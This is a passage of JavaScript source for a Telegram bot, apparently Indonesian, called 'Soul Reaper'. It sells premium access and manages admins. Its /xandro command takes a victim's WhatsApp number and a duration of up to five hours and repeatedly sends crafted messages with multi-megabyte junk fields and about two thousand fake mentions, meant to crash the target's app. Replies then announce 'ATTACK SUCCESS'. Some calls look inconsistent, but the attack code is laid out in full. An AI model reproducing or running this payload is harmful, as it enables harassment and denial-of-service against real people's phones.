      },
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error("Error in addprem:", error);
    await ctx.reply("❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.action(/cekprem_(\d+)/, async (ctx) => {
  try {
    await ctx.answerCbQuery("📊 Mengecek premium...", {
      show_alert: false
    });
    const targetId = ctx.match[1];
    const info = getPremiumInfo(targetId);
    if (!info) {
      return await ctx.reply(
        `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ❌ NON-PREMIUM / EXPIRED
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.update.callback_query.message.message_id
        }
      );
    }
    const now = Date.now();
    const remaining = info.expiresAt - now;
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ✅ PREMIUM ACTIVE
│ - Expired: ${formatWIB(info.expiresAt)}
│ - Sisa: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.update.callback_query.message.message_id
      }
    );
  } catch (error) {
    console.error("Error cekprem callback:", error);
  }
});

bot.command("delprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  if (!(await guardOwnerOrAdmin(ctx))) return;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  let userId = null;
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    if (args.length < 2) {
      return await ctx.reply(
        "❌ Format salah.\n\nGunakan:\n- Reply: (reply user) /delprem\n- Manual: /delprem <id_user>", {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    userId = String(args[1])
      .trim();
  }
  try {
    const existed = deletePremiumUser(userId);
    if (!existed) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐏𝐫𝐞𝐦 』═══════⊱
│
│ - ID User: ${userId}
│ - Status: Tidak terdaftar / sudah expired
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    return await ctx.reply(
      `
╭═══════『 𝐃𝐞𝐥 𝐏𝐫𝐞𝐦 』═══════⊱
│
│ - ID User: ${userId}
│ - Status: Premium dihapus ✅
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  } catch (error) {
    console.error("Error in delprem:", error);
    return await ctx.reply("❌ Gagal menghapus premium. Coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.command("cekprem", async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  if (!(await guardOwnerOrAdmin(ctx))) return;
  const args = ctx.message.text.trim()
    .split(/\s+/);
  let targetId;
  if (ctx.message.reply_to_message) {
    targetId = String(ctx.message.reply_to_message.from.id);
  } else if (args.length >= 2) {
    targetId = String(args[1])
      .trim();
  } else {
    targetId = String(ctx.from.id);
  }
  try {
    const info = getPremiumInfo(targetId);
    if (!info) {
      return await ctx.reply(
        `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ❌ NON-PREMIUM / EXPIRED
│
╰═════════════════════⊱`.trim(), {
          reply_to_message_id: ctx.message.message_id
        }
      );
    }
    const remaining = info.expiresAt - Date.now();
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
│ - ID: ${targetId}
│ - Status: ✅ PREMIUM ACTIVE
│ - Expired: ${formatWIB(info.expiresAt)}
│ - Sisa: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  } catch (error) {
    console.error("Error in cekprem:", error);
    return await ctx.reply("❌ Terjadi kesalahan saat cek premium.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});

bot.command("addadmin", async (ctx) => {
  if (!(await guardOwnerOnly(ctx))) return;
  ensureAdminsFile();
  const args = ctx.message.text.trim().split(/\s+/);
  let userId = null;
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    if (args.length < 2) {
      return await ctx.reply(
        `
╭═══════『 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
│ • Reply pesan user + ketik /addadmin
│ • /addadmin <id_user>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • Reply pesan + /addadmin
│ • /addadmin 123456789
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }
    userId = String(args[1]).trim();
  }

  if (isAdmin(userId)) {
    return await ctx.reply(
      `
╭═══════『 𝐆𝐚𝐠𝐚𝐥 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • User sudah menjadi admin
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
      { reply_to_message_id: ctx.message.message_id }
    );
  }

  try {
    addAdmin(userId);

    let userInfo = "";
    if (ctx.message.reply_to_message) {
      const u = ctx.message.reply_to_message.from;
      userInfo =
        `│ - *Username:* ${u.username ? "@" + u.username : "Tidak ada"}\n` +
        `│ - *Nama:* ${u.first_name || "Tidak diketahui"}\n`;
    }

    const successMessage = `
╭═══════『 𝐀𝐝𝐦𝐢𝐧 𝐀𝐝𝐝𝐞𝐝 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ - *ID:* ${userId}
${userInfo}│ - *Status:* Admin Active ✅
│
├─────『 𝐀𝐜𝐜𝐞𝐬𝐬 』
│ • /addprem command
│ • /delprem command
│ • Premium management
│
╰═════════════════════⊱`.trim();

    await ctx.replyWithMarkdown(successMessage, {
      reply_markup: {
        inline_keyboard: [[{ text: "📋 ADMIN LIST", callback_data: "listadmin" }]]
      },
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error("Error in addadmin:", error);
    await ctx.reply("❌ Terjadi kesalahan saat menambahkan admin. Silakan coba lagi.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});

bot.command("deladmin", async (ctx) => {
  if (!(await guardOwnerOnly(ctx))) return;

  ensureAdminsFile();

  const args = ctx.message.text.trim().split(/\s+/);
  let userId = null;

  // Reply mode
  if (ctx.message.reply_to_message) {
    userId = String(ctx.message.reply_to_message.from.id);
  } else {
    // Manual mode
    if (args.length < 2) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
├─────『 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 』
│ • Reply pesan user + ketik /deladmin
│ • /deladmin <id_user>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • Reply pesan + /deladmin
│ • /deladmin 123456789
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }
    userId = String(args[1]).trim();
  }

  try {
    const removed = removeAdmin(userId);

    if (!removed) {
      return await ctx.reply(
        `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
│ • Status: ID tidak ditemukan ❌
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
        { reply_to_message_id: ctx.message.message_id }
      );
    }

    return await ctx.reply(
      `
╭═══════『 𝐃𝐞𝐥 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
│
│ • Status: Admin dihapus ✅
│ • ID: ${userId}
│
╰═════════════════════⊱`.trim(),
      { reply_to_message_id: ctx.message.message_id }
    );
  } catch (error) {
    console.error("Error in deladmin:", error);
    return await ctx.reply("❌ Terjadi kesalahan saat menghapus admin.", {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.action("listadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
    await ctx.answerCbQuery();
    return await ctx.reply("LU SIAPA BANGSAT?????", {
      reply_to_message_id: ctx.update.callback_query.message.message_id,
      reply_markup: {
        inline_keyboard: [[{ text: "💬 t.me/zihardev", url: "https://t.me/zihardev" }]]
      }
    });
  }

  ensureAdminsFile();
  loadAdmins();

  const adminListString =
    adminList.length > 0
      ? adminList.map((id) => `- ${id}`).join("\n")
      : "Tidak ada admin yang terdaftar.";

  const message = `
ℹ️ Daftar Admin:
${adminListString}
Total: ${adminList.length} admin.
  `.trim();

  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(message, {
    reply_to_message_id: ctx.update.callback_query.message.message_id
  });
});

const prosesrespone = async (target, ctx) => {
  const processMessage = `
╔══════════════════
║ 🎯TARGET: +${target.split('@')[0]}
║ ⚔️ STATUS: proses...
╚══════════════════`;
  try {
    await ctx.reply(processMessage);
  } catch (error) {
    console.error('Process error:', error);
  }
};

const donerespone = async (target, ctx) => {
  const successMessage = `
╔══════════════════ 
║ 🎯 TARGET: +${target.split('@')[0]}
║ ✨ STATUS: ATTACK SUCCESS
╚══════════════════`;
  try {
    await ctx.reply(successMessage);
  } catch (error) {
    console.error('Response error:', error);
  }
};
const checkWhatsAppConnection = async (ctx, next) => {
  if (!isWhatsAppConnected) {
    await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
    return;
  }
  await next();
};


function formatPhoneNumber(number) {
  let cleaned = number.replace(/[^0-9]/g, '');
  cleaned = cleaned.replace(/^\+/, '');
  if (cleaned.startsWith('0')) {
    cleaned = '62' + cleaned.slice(1);
  }
  if (!cleaned.startsWith('62')) {
    cleaned = '62' + cleaned;
  }
  return cleaned;
}
//s

bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
  const userId = ctx.from.id;
  const st = getUserState(userId);
  const now = Date.now();
  if (st?.state === "running") {
    const remaining = (st.endAt || now) - now;
    return await ctx.reply(
      `
╭═══════『 𝐏𝐫𝐨𝐬𝐞𝐬 』═══════⊱
│
│ • Status: Masih berjalan ⏳
│ • Sisa: ${msToHuman(remaining)}
│ • Target: ${st.lastTarget || "-"}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }

  if (st?.state === "cooldown") {
    const remaining = (st.until || now) - now;
    return await ctx.reply(
      `
╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
│
│ • Status: Masih Cooldown ⏳
│ • Tunggu: ${msToHuman(remaining)}
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  if (activeRunLocks.has(String(userId))) {
    return await ctx.reply(
      "⏳ Perintahmu lagi diproses. Tunggu sampai selesai ya.", {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  const args = ctx.message.text.split(/\s+/);
  if (args.length < 3) {
    return await ctx.reply(
      `
╭═══════⟨ 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
│
│ • /xandro 628xxx 1m   (1 menit)
│ • /xandro 628xxx 1j   (1 jam)
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support 0/62/+62
│ • Max durasi: 5 jam (5j)
│ • Jeda per pesan: 3 detik
│
╰═════════════════════⊱`.trim(), {
        reply_to_message_id: ctx.message.message_id
      }
    );
  }
  const nomorHP = args[1];
  const durationInput = String(args[2])
    .toLowerCase();
  let durationMs = 0;
  if (durationInput.endsWith("m")) {
    const minutes = parseInt(durationInput.replace("m", ""), 10);
    if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
    durationMs = minutes * 60 * 1000;
  } else if (durationInput.endsWith("j")) {
    const hours = parseInt(durationInput.replace("j", ""), 10);
    if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
    if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
    durationMs = hours * 60 * 60 * 1000;
  } else {
    return await ctx.reply(
      "❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
  }
  const nomorFix = formatPhoneNumber(nomorHP);
  const target = nomorFix + "@s.whatsapp.net";
  const startedAt = Date.now();
  const endAt = startedAt + durationMs;
  activeRunLocks.add(String(userId));
  setUserRunning(userId, {
    startedAt,
    endAt,
    durationMs,
    lastTarget: nomorFix
  });
  await prosesrespone(target, ctx);
  const runAttack = async () => {
    try {
      while (Date.now() < endAt) {
        if (!isWhatsAppConnected) break;
        await Seg(sock, target);
        await sleep(3000);
      }
    } catch (err) {
      console.error("runAttack error:", err);
    } finally {
      try {
        await donerespone(target, ctx);
      } catch (e) {
        console.error("donerespone error:", e);
      }
      const until = Date.now() + COOLDOWN_AFTER_DONE_MS;
      setUserCooldown(userId, {
        until,
        lastTarget: nomorFix,
        lastDoneAt: Date.now()
      });

      activeRunLocks.delete(String(userId));
    }
  };
  runAttack();
});



// ===== START MENU =====
bot.start(async (ctx) => {
  try {
    const chatId = ctx.chat?.id;
    if (!chatId) return;
    try {
      await ctx.telegram.sendChatAction(chatId, "typing");
    } catch {}
    const videoUrl = "https://files.catbox.moe/mnlvy3.mp4";
    const audioUrl =
      "https://raw.githubusercontent.com/bayuxxd/bebasajamaukayagmna/main/lagu.mp3";

    const caption = `<blockquote>
╔═⸸ 𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑 ⸸═╗
║ ᝰ.ᐟ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴋᴇɢᴇʟᴀᴘᴀɴ
║ ᝰ.ᐟ ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇᴍɪʟɪʜ
║     ⸸ sᴏᴜʟ ʀᴇᴀᴘᴇʀ ⸸
╠══════════════════════╣
║ ᴘᴇʀɪɴɢᴀᴛᴀɴ:
║ • ɢᴜɴᴀᴋᴀɴ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴇʀsᴀʟᴀʜ
║ • sᴇᴍᴏɢᴀ ʙᴇʀᴍᴀɴғᴀᴀᴛ ☠
╚══════════════════════╝

╭━⸸ ɪɴғᴏ ᴄᴏʀᴇ ⸸━╮
ᝰ.ᐟ ᴅᴇᴠ
╰⪼ @zihardev
ᝰ.ᐟ ᴠᴇʀsɪ
╰⪼ 2
ᝰ.ᐟ ʙᴀʜᴀsᴀ
╰⪼ ᴊᴀᴠᴀsᴄʀɪᴘᴛ
╰━⪼
ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote>
» © 𐊖𐊒𐌵𐎘 ! @zihardev`;

    const keyboard = [
      [
        { text: "MENU DEV", callback_data: "soultampleng" },
        { text: "MENU", callback_data: "bugmen" },
      ],
      [
        { text: "ADM MENU", callback_data: "ulznxx" },
        { text: "SI GANTENG", url: "https://t.me/zihardev" },
      ],
    ];

    const replyTo = ctx.message?.message_id;
    await ctx.replyWithVideo(videoUrl, {
      caption,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
      ...(replyTo ? { reply_to_message_id: replyTo } : {}),
    });
    setTimeout(async () => {
      try {
        await bot.telegram.sendAudio(chatId, audioUrl, {
          title: "𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑",
          performer: "Version 1.1",
          caption: "𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑",
          parse_mode: "HTML",
        });
      } catch (e) {
        console.error("SEND AUDIO ERROR:", e);
        try {
          await ctx.reply("Audio gagal dikirim (link/timeout).");
        } catch {}
      }
    }, 300);
  } catch (err) {
    console.error("START ERROR:", err);
    try {
      await ctx.reply("Bot aktif ✅");
    } catch {}
  }
});

bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
  try {
    await ctx.answerCbQuery();
    const data = ctx.callbackQuery.data;

    let newCaption = "";
    let keyboard;

    if (data === "soultampleng") {
      newCaption = `<blockquote>
╭━( ᴏᴡɴᴇʀ ᴍᴇɴᴜ )
│ ᝰ.ᐟ /addadmin   
╰⪼» System Admin Control
│
│ ᝰ.ᐟ /deladmin     
╰⪼» Remove Admin Access
│
│ ᝰ.ᐟ /addpairing   
╰⪼» Connect WhatsApp
│
│ ᝰ.ᐟ /removeallbot 
╰⪼» Remove Bot / Sender

» © 𐊖𐊒𐌵𐎘
</blockquote>`;

      const dodo = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = dodo;
      
    } else if (data === "ulznxx") {
      newCaption = `<blockquote>
╭━( ᴘʀᴇᴍɪᴜᴍ ᴍᴇɴᴜ )
│ ᝰ.ᐟ /addprem
╰⪼» Grant Premium Power
│
│ ᝰ.ᐟ /delprem
╰⪼» Revoke Premium Access
│
│ ᝰ.ᐟ /cekprem
╰⪼» Cek Premium (Owner/Admin)

» © 𐊖𐊒𐌵𐎘
</blockquote>`;

      const wowo = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = wowo;
      
    } else if (data === "bugmen") {
      const premInfo = getPremiumInfo(ctx.from.id);

      newCaption = `<blockquote>
╭━( ᴀɴᴅʀᴏɪᴅ ʙᴜɢs )
│ ᝰ.ᐟ /xandro
╰⪼» ⚡(FC)
│
╭━( sᴛᴀᴛᴜs )
│ ᝰ.ᐟ Premium: ${premInfo ? "✅ Active" : "❌ Not Active"}
│
╭━( ɪɴғᴏ )
│ ᝰ.ᐟ Metode: Durasi (m/j)
│ ᝰ.ᐟ Jeda: 3 Detik
│ ᝰ.ᐟ Max: 5 Jam
│ ᝰ.ᐟ Premium only commands
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱

» © 𐊖𐊒𐌵𐎘
</blockquote>`;

      const singantuk = [
        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
        [{ text: "💎 PREMIUM ACCESS", callback_data: "premiuminfo" }],
        [{ text: "⬅️ BACK", callback_data: "byza" }],
      ];
      keyboard = singantuk;
      
    } else if (data === "byza") {
      newCaption = `<blockquote>
╔═⸸ 𝐒𝐎𝐔𝐋 𝐑𝐄𝐀𝐏𝐄𝐑 ⸸═╗
║ ᝰ.ᐟ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴋᴇɢᴇʟᴀᴘᴀɴ
║ ᝰ.ᐟ ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇᴍɪʟɪʜ
║     ⸸ sᴏᴜʟ ʀᴇᴀᴘᴇʀ ⸸
╠══════════════════════╣
║ ᴘᴇʀɪɴɢᴀᴛᴀɴ:
║ • ɢᴜɴᴀᴋᴀɴ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴇʀsᴀʟᴀʜ
║ • sᴇᴍᴏɢᴀ ʙᴇʀᴍᴀɴғᴀᴀᴛ ☠
╚══════════════════════╝

╭━⸸ ɪɴғᴏ ᴄᴏʀᴇ ⸸━╮
ᝰ.ᐟ ᴅᴇᴠ
╰⪼ @zihardev
ᝰ.ᐟ ᴠᴇʀsɪ
╰⪼ 2
ᝰ.ᐟ ʙᴀʜᴀsᴀ
╰⪼ ᴊᴀᴠᴀsᴄʀɪᴘᴛ
╰━⪼
ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ
</blockquote>
» © 𐊖𐊒𐌵𐎘 ! @zihardev`;

      const ngewesawitdb = [
        [
          { text: "MENU DEV", callback_data: "soultampleng" },
          { text: "MENU", callback_data: "bugmen" },
          { text: "ADM MENU", callback_data: "ulznxx" },
          { text: "SI GANTENG", url: "https://t.me/zihardev" },
        ],
      ];
      keyboard = ngewesawitdb;
    }

    await ctx.editMessageCaption(newCaption, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (err) {
    console.error("Menu callback error:", err);
  }
});


bot.command('bugmen', async (ctx) => {
const premiumlahNgentod = getPremiumInfo(ctx.from.id);
  const imageUrl2 = "https://files.catbox.moe/rn570i.jpg";
  const Zee1 = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /xandro ⚡(FC)
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${premiumlahNgentod ? '✅ Active' : '❌ Not Active'}
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Metode: Durasi (m/j)
│ • Jeda: 3 Detik
│ • Max: 5 Jam
│ • Premium only commands
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
  const keyboard = [
    [{
      text: "RESELLER",
      url: "https://t.me/zihardev"
    }],
    [{
      text: "💎 PREMIUM ACCESS",
      callback_data: "premiuminfo"
    }]
  ];
  await ctx.replyWithPhoto(imageUrl2, {
    caption: Zee1,
    reply_markup: {
      inline_keyboard: keyboard
    },
    reply_to_message_id: ctx.message.message_id
  });
});
async function clearChat(target) {
  try {
    const targetJid = targetNumber.includes("@s.whatsapp.net") ?
      targetNumber :
      `${target}@s.whatsapp.net`;
    const chats = sock.chats.get(targetJid);
    if (!chats) {
      console.log("Target chat tidak ditemukan!");
      return;
    }
    await sock.modifyChat(targetJid, "delete");
    console.log(`Semua pesan dengan ${target} telah dihapus.`);
  } catch (error) {
    console.error("Gagal menghapus chat:", error);
  }
}

//FANGSYEN
async function Seg(target, ptcp = true) {
    for (let r = 0; r < 100; r++) {
        const payload = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Power",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message,
            },
        }, ptcp ? {
            messageId: payload.key.id,
            participant: {
                jid: target
            }
        } : {
            messageId: payload.key.id
        });
        await sleep(1000);
    }
    let payload = "";
    for (let i = 0; i < 399; i++) {
        payload = "\u0000".repeat(2097152);
    }

    const Jambutxx = [
        "0@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
                    fileLength: "211396",
                    height: 816,
                    width: 654,
                    mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
                    fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
                    directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749220174",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
                    contextInfo: {
                        mentionedJid: Jambutxx,
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}



bot.launch({
    dropPendingUpdates: true
  })
  .then(() => {
    console.log("𝕾𝖔𝖚𝖑 𝖛𝟙 𝖌𝖊𝖓𝟚 | @bydaa");
  })
  .catch((err) => {
    console.error("Error starting bot:", err);
    setTimeout(() => process.exit(1), 5000);
  });
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
// <--- INI PENYEBABNYA